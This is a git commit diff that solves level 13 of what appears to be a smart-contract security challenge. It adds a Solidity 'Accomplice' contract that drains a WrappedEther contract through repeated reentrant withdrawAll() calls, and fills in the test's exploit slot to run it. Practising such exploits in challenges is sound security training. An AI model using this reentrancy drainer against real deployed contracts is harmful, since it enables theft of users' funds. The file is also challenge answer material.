a324ae9be2898207b6b49421f4566a9ae8633dde
Vyacheslav Ryzhkov <rugrisser@gmail.com>
2024-11-24 23:42:24 +0300

    Task 13 solved

--- test/13_WrappedEther.t.sol
+++ test/13_WrappedEther.t.sol
@@ -4,6 +4,40 @@ pragma solidity ^0.8.25;
 import "./BaseTest.t.sol";
 import "src/13_WrappedEther/WrappedEther.sol";
 
+contract Accomplice {
+    WrappedEther instance;
+    uint256 retries;
+    uint256 counter = 0;
+    bool isRobbing = false;
+
+    constructor(WrappedEther _instance) {
+        instance = _instance;
+    }
+
+    function deposit() external {
+        instance.deposit{value: 0.01 ether}(address(this));
+    }
+
+    function startRobbery(uint256 _retries) external {
+        isRobbing = true;
+        counter = 0;
+        retries = _retries;
+        instance.withdrawAll();
+    }
+
+    receive() external payable {
+        if (isRobbing) {
+            counter++;
+
+            if (counter < retries) {
+                instance.withdrawAll();
+            } else {
+                isRobbing = false;
+            }
+        }
+    }
+}
+
 // forge test --match-contract WrappedEtherTest
 contract WrappedEtherTest is BaseTest {
     WrappedEther instance;
@@ -16,7 +50,12 @@ contract WrappedEtherTest is BaseTest {
     }
 
     function testExploitLevel() public {
-        /* YOUR EXPLOIT GOES HERE */
+        vm.prank(user1);
+
+        Accomplice accomplice = new Accomplice(instance);
+        payable(address(accomplice)).call{value: 0.01 ether}("");
+        accomplice.deposit();
+        accomplice.startRobbery(10);
 
         checkSuccess();
     }
